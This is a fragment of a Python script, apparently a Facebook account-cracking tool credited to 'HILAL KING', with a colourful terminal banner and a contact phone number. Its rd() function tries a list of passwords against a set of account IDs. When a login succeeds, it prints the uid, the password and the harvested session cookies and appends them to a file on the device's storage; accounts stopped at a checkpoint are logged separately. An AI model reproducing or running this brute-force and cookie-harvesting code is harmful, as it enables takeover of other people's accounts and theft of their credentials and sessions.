#OWNER_______________𝐇𝐈𝐋𝐀𝐋 KING
...
╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
 ...
 \033[1;92m----------------------------------------------
 \033[1;97m[ \033[1;92m+ \033[1;97m]  \033[1;92m𝘼𝙐𝙏𝙃𝙊𝙍      :\033[1;92m  √   HILAL KING
 \033[1;97m[ \033[1;92m+ \033[1;97m]  \033[1;92m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋    : \033[1;92m √  +93764274616
 \033[1;97m[ \033[1;92m+ \033[1;97m]  \033[1;92m𝗕𝗘𝗦𝗧 𝗙𝗥𝗜𝗘𝗡𝗗 : \033[92;1m √   SILAB ASHNA
 \033[1;97m[ \033[1;92m+ \033[1;97m]  \033[1;92m𝗦𝗧𝗔𝗧𝗨𝗦      : \033[1;97m √  𝐅𝐑𝐄𝐄
 \033[1;97m[ \033[1;92m+ \033[1;97m]  \033[1;92m𝗩𝗘𝗥𝗦𝗜𝗢𝗡     : \033[1;92m √  1
 \033[1;92m---------------------------------------------"""
def line():
	print(f'\033[1;92m----------------------------------------------------')
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;32m\x1b[1;92m [ HILAL... \x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				uid = str(po['uid'])                                  
				print('\r\r\033[1;32m [HILAL] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				open('/sdcard/HILAL-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
                                
				break
			elif 'www.facebook.com' in po['error']['message']:                                
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;31m [HILAL-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/HILAL-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
